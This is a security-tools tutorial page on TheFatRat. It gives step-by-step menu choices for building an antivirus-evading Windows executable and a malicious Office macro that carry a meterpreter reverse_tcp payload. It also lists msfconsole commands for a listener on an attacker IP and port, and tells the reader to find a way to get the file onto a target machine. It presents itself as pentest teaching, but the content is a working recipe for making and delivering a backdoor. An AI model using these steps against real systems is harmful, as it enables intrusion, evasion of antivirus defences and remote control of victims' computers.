---
path: "/tutorials/securitypentesttools/theFatRat"
date: "2020-04-06"
title: "TheFatRat"
---

TheFatRat is a tool to create backdoors and payloads that can bypass anti-virus programs. For more information on this please see the <a href="https://github.com/Screetsec/TheFatRat" target="_blank" rel="noopener noreferrer">GitHub repository</a>.

To use TheFatRat you'll have to grab it from that github repository. The installation instructions are there too. If you don't have all the packages or yours aren't up to date TheFatRat will install and update them for you, this may take a little bit of time. 

Once you've got it installed, depending how you installed it, you should be able to run TheFatRat by typing `fatrat` into the command line. 

Once that's loaded you'll be presented with a menu of options. For this tutorial we'll be creating a fud backdoor 1000% with PwnWinds (AKA option 6). 

Another menu will appear, we'll choose to create an exe file with apache + Powershell (FUD 100%) (AKA option 3). 

You'll be prompted to the LHOST value, and the LPORT. Enter the listener's (attacker) IP and port it will listen on.

You'll be asked to enter the base name for output files.

Now you will be asked to generate a payload. I'm choosing windows/meterpreter/reverse_tcp. When you've selected an option the payload will be generated, if you're using the default options it will be placed in a directory called Fatrat_Generated under your home directory.

We're now going to create a backdoor for Office with Microsploit (option 7). This will take the form of an Office Macro on Windows (option 2 in the next menu). 

You'll then get options for the listener IP, port, output filename. You can also enter a message for the document's body. 

Finally you'll be asked if  you want to use a custom exe file backdoor. This is where we'll use the payload we made earlier. Enter the directory it was save in.

You'll have the option to choose a payload. Choose windows/meterpreter/reverse_tcp. You'll be presented with the backdoor's details. Your payload has now been generated and will be stored in the same place as the other payload.

We'll now want to launch msfconsole and set up our listener.

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attackerIP>
set LPORT <attackerPort>
run
```

You'll have to find a way to get the malicious file onto the target machine. Once it's there and has been run you will have a meterpreter session set up. **N.B.** The user will have to enable the content for our payload to run.

Doing a simple `sysinfo` will confirm if this has worked.